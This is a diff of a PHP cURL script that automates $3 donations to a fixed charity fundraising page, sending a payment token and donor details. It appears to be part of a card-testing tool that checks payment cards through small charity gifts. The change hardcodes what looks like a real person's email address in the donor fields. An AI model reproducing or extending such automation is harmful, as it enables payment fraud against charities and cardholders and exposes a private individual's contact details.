@@ -170,7 +170,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 # ----------------- [2req Postfields] ---------------------#
 
 curl_setopt($ch, CURLOPT_POSTFIELDS,'{"pageId":3148,"paymentMethod":{"paymentType":1,"token":"'.$token.'"},"amountType":0,"anonymityID":0,"scheduledGivingStartDate":"2022-03-23","amount":3,"messageToCharity":"","suggestedAskAmount":3,"fundID":259396,"donorInfo":{"firstName":"'.$name.'","lastName":"'.$last.'
-","emailAddress":"'.$email.'","companyName":"","addressInfo":{"addressLine1":"'.$street.'","addressLine2":"","city":"'.$city.'","country":"US","postalCode":"'.$zip.'","province":"'.$state.'","id":-1},"donorType":"PERSONAL"},"dedication":null,"eCard":null,"postCard":null,"languagePreference":1,"feeInfo":{"IsAmountTheNet":false,"OfferedFee":null},"isEmbedded":true,"isMobile":false,"metaData":{"QuestionOne":"","AnswerOne":"","PhoneNumber":"","AddToMailingList":false}}');
+","emailAddress":"kjohnston46@yahoo.com","companyName":"","addressInfo":{"addressLine1":"'.$street.'","addressLine2":"","city":"'.$city.'","country":"US","postalCode":"'.$zip.'","province":"'.$state.'","id":-1},"donorType":"PERSONAL"},"dedication":null,"eCard":null,"postCard":null,"languagePreference":1,"feeInfo":{"IsAmountTheNet":false,"OfferedFee":null},"isEmbedded":true,"isMobile":false,"metaData":{"QuestionOne":"","AnswerOne":"","PhoneNumber":"","AddToMailingList":false}}');
 
 
 $result2 = curl_exec($ch);
